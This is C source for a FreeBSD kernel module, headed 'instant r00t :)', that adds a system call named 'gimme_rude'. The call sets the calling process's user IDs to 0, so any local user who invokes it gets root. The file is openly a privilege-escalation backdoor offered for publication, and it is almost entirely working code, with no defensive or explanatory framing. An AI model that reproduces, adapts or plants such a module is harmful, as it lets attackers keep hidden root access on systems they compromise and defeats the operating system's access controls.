/* 
	instant r00t :)
	ancient code, time to publish 
	by -
 */	

#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/imgact.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <sys/sysproto.h>


/*
 * The function for implementing the syscall.
 */

static int
gimme_rude (struct thread *td, void *arg)
{
	td->td_proc->p_ucred->cr_uid=0;
	td->td_proc->p_ucred->cr_ruid=0;
	td->td_proc->p_ucred->cr_uid=0;
	td->td_proc->p_ucred->cr_uid=0;
return 0;
}

static struct sysent gimme_rude_sysent = {
	0,			/* sy_narg */
	gimme_rude		/* sy_call */
};

static int offset = NO_SYSCALL;

static int
load (struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD :
		printf ("call me at %d\n", offset);
		break;
	case MOD_UNLOAD :
		printf ("call me at %d\n", offset);
		break;
	default :
		error = EOPNOTSUPP;
		break;
	}
	return error;
}

SYSCALL_MODULE(syscall, &offset, &gimme_rude_sysent, load, NULL);
